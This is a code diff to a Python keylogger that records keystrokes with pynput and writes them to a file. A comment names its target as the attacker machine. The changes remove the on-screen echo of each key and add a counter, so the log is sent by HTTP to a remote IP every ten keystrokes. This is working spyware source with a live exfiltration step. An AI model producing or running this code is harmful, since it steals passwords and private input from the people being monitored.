@@ -1,6 +1,8 @@
 import requests
 from pynput.keyboard import Key, Listener
 
+counter = 0
+
 # sends key log to attacker machine
 def send_log():
     url = "http://172.16.23.130:8000"
@@ -13,8 +15,13 @@ def send_log():
 # captures keystrokes
 def on_press(key):
 
-    print("\n{0} pressed.".format(key))
+    global counter
+    counter += 1
     write_file(key)
+
+    if counter >= 10:
+        send_log()
+        counter = 0
 
 # writes keystrokes to file
 def write_file(key):
@@ -34,4 +41,3 @@ if __name__ == "__main__":
     open('keylog.txt', 'w').close()
     with Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
-    send_log()
